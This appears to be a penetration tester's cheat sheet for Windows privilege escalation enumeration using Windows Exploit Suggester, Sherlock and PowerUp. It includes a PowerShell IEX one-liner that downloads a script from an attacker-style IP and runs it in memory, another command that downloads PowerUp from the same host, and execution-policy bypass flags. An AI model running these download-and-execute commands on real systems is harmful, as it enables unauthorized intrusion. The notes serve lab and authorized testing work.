# Privesc Openings

## Windows Exploiter Suggester

```bash
# https://github.com/bitsadmin/wesng

# 1. Copy and paste into system.txt in kali
Systeminfo	

# 2. Update windows exploit suggester. Will generate a .xls file 
python windows-exploit-suggester.py --update	

# 3. Start suggesting an exploit
python windows-exploit-suggester.py --database <generated xls> --systeminfo system.txt	

```

## Sherlock

### Find All Vulns

```c
# find-allvulns 1
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/Sherlock.ps1')	
find-allvulns

# find-allvulns 2
powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; find-allvulns}"	


```

### PowerUp Invoke-AllChecks

```c
# Start powershell
powershell.exe -exec bypass	

# Download powerup
(New-Object Net.WebClient).DownloadFile('http://10.10.14.32/PowerUp.ps1','C:\Users\Destination\Folder\PowerUp.ps1')	

# Import script
Import-Module .\PowerUp.ps1	

# Start checks
Invoke-AllChecks	
```

